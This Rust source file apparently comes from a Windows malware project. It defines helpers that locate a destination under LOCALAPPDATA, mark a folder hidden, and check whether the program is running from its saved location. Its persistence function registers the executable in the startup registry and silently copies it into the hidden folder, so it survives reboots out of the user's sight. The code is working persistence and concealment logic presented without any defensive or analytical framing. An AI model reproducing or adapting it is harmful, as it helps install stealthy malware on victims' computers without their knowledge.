use std::{
    env::{self, current_exe, var},
    fs::{copy, create_dir_all},
    io,
    os::windows::prelude::OsStrExt,
    path::{PathBuf, Path},
};
use winapi::um::{fileapi::SetFileAttributesW, winnt::FILE_ATTRIBUTE_HIDDEN};

use crate::{fs, os, FILE_NAME, FOLDER_NAME};

pub fn file_exists(file_path: &PathBuf) -> bool {
    file_path.exists() && file_path.is_file()
}

pub fn set_hidden_attribute<P: AsRef<Path>>(path: P) -> io::Result<()> {
    let path = path.as_ref();

    let path_wide: Vec<u16> = path
        .as_os_str()
        .encode_wide()
        .chain(Some(0))
        .collect();

    let ret = unsafe { 
        SetFileAttributesW(
            path_wide.as_ptr(), 
            FILE_ATTRIBUTE_HIDDEN
        ) 
    };

    if ret == 0 {
        Err(io::Error::last_os_error())
    } else {
        Ok(())
    }
}

pub fn get_destination_path() -> (PathBuf, PathBuf) {
    let desired_path = PathBuf::from(var("LOCALAPPDATA").unwrap()).join(FOLDER_NAME);

    (desired_path.join(FILE_NAME), desired_path)
}

pub fn running_from_save_path() -> bool {
    let file_path: PathBuf = PathBuf::from(var("LOCALAPPDATA").unwrap())
        .join(FOLDER_NAME)
        .join(FILE_NAME);

    let mut current_path = current_exe().unwrap();

    if let Ok(stripped_path) = current_path.strip_prefix(r"\\?\") {
        current_path = PathBuf::from(stripped_path);
    };

    file_path == current_path
}

pub fn persistence() -> io::Result<()> {
    let current_path = env::current_exe()?;

    let (file_path, folder_path) = fs::get_destination_path();

    match os::add_to_startup_registry(file_path.to_str().unwrap().to_string()) {
        Ok(..) => {
            if !fs::file_exists(&file_path) {
                create_dir_all(&folder_path)?;

                set_hidden_attribute(
                    &folder_path.as_os_str()
                ).unwrap();

                copy(current_path, file_path)?;
            }
        }
        Err(..) => {}
    };

    Ok(())
}
